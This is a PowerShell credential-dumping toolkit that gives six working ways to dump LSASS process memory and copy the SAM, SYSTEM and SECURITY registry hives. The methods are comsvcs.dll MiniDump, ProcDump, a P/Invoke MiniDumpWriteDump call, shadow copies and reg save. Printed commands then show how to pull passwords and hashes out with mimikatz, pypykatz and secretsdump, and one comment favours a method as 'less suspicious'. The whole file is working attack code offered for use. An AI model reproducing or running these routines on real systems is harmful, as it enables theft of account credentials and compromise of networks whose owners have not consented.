<#
.SYNOPSIS
    Multiple methods for dumping LSASS process memory.
.DESCRIPTION
    Various techniques to create a memory dump of lsass.exe for offline
    credential extraction with Mimikatz or pypykatz.
.NOTES
    MITRE ATT&CK: T1003.001 — LSASS Memory
    Requires: Administrative privileges (most methods)
    Offline extraction: mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
                     or: pypykatz lsa minidump lsass.dmp
#>

function Dump-ComsvcsMethod {
    param([string]$OutPath = "$env:TEMP\lsass.dmp")
    <# Uses comsvcs.dll MiniDump — built into Windows, no tools needed #>
    $lsass = Get-Process lsass
    $cmd = "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $OutPath full"
    cmd /c $cmd
    if (Test-Path $OutPath) {
        Write-Output "[+] LSASS dump created: $OutPath ($('{0:N2}' -f ((Get-Item $OutPath).Length / 1MB)) MB)"
    } else {
        Write-Output "[-] Dump failed. Try running from SYSTEM context."
    }
}

function Dump-ProcDumpMethod {
    param(
        [string]$OutPath = "$env:TEMP\lsass.dmp",
        [string]$ProcDumpPath = "procdump64.exe"
    )
    <# Sysinternals ProcDump — signed Microsoft binary, less suspicious #>
    & $ProcDumpPath -accepteula -ma lsass.exe $OutPath
    Write-Output "[+] ProcDump method complete: $OutPath"
}

function Dump-MiniDumpWriteDump {
    param([string]$OutPath = "$env:TEMP\lsass.dmp")
    <# Direct Win32 API call via P/Invoke — no external tools #>
    $code = @'
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

public class MiniDump {
    [DllImport("dbghelp.dll", SetLastError = true)]
    static extern bool MiniDumpWriteDump(
        IntPtr hProcess, uint processId, IntPtr hFile,
        uint dumpType, IntPtr exceptionParam,
        IntPtr userStreamParam, IntPtr callbackParam);

    public static bool Dump(string outputFile) {
        var proc = Process.GetProcessesByName("lsass")[0];
        using (var fs = new FileStream(outputFile, FileMode.Create)) {
            return MiniDumpWriteDump(
                proc.Handle, (uint)proc.Id,
                fs.SafeFileHandle.DangerousGetHandle(),
                2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
'@
    Add-Type -TypeDefinition $code -Language CSharp
    $result = [MiniDump]::Dump($OutPath)
    if ($result) {
        Write-Output "[+] MiniDumpWriteDump succeeded: $OutPath"
    } else {
        Write-Output "[-] MiniDumpWriteDump failed (error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }
}

function Dump-TaskManagerMethod {
    Write-Output @"
[*] Manual Task Manager Method:
    1. Open Task Manager (Ctrl+Shift+Esc)
    2. Click "More details" if in compact mode
    3. Go to "Details" tab
    4. Right-click "lsass.exe"
    5. Select "Create dump file"
    6. Dump saved to: %LOCALAPPDATA%\Temp\lsass.DMP

    Alternative: Process Explorer (Sysinternals)
    Right-click lsass.exe -> Create Full Dump
"@
}

function Dump-ShadowCopyMethod {
    <# Create a shadow copy and extract SAM/SYSTEM/SECURITY hives #>
    $shadow = (wmic shadowcopy call create Volume='C:\' 2>$null | Select-String 'ShadowID').ToString() -replace '.*= ','' -replace '"',''
    if ($shadow) {
        $shadowPath = (wmic shadowcopy where "ID='$shadow'" get DeviceObject 2>$null | Select-String '\\\\').ToString().Trim()
        cmd /c "copy $shadowPath\Windows\System32\config\SAM $env:TEMP\SAM" 2>$null
        cmd /c "copy $shadowPath\Windows\System32\config\SYSTEM $env:TEMP\SYSTEM" 2>$null
        cmd /c "copy $shadowPath\Windows\System32\config\SECURITY $env:TEMP\SECURITY" 2>$null
        Write-Output "[+] SAM/SYSTEM/SECURITY extracted to $env:TEMP"
        Write-Output "[*] Crack with: secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL"
    } else {
        Write-Output "[-] Shadow copy creation failed"
    }
}

function Dump-RegSaveMethod {
    <# Save SAM/SYSTEM/SECURITY hives directly from registry #>
    reg save HKLM\SAM "$env:TEMP\SAM" /y 2>$null
    reg save HKLM\SYSTEM "$env:TEMP\SYSTEM" /y 2>$null
    reg save HKLM\SECURITY "$env:TEMP\SECURITY" /y 2>$null
    Write-Output "[+] Registry hives saved to $env:TEMP"
    Write-Output "[*] Extract hashes:"
    Write-Output "    secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL"
    Write-Output "    mimikatz: lsadump::sam /system:SYSTEM /sam:SAM"
}

Write-Output @"
[*] LSASS Dump Methods Loaded:

    Dump-ComsvcsMethod       -OutPath "C:\temp\lsass.dmp"   # Built-in, no tools
    Dump-ProcDumpMethod      -OutPath "C:\temp\lsass.dmp"   # Sysinternals signed binary
    Dump-MiniDumpWriteDump   -OutPath "C:\temp\lsass.dmp"   # Direct API, no external tools
    Dump-TaskManagerMethod                                    # Manual instructions
    Dump-ShadowCopyMethod                                    # Extract SAM/SYSTEM/SECURITY
    Dump-RegSaveMethod                                       # reg save hives

[*] Offline analysis:
    mimikatz: sekurlsa::minidump lsass.dmp
              sekurlsa::logonpasswords
    pypykatz: pypykatz lsa minidump lsass.dmp
    impacket: secretsdump.py -sam SAM -system SYSTEM LOCAL
"@
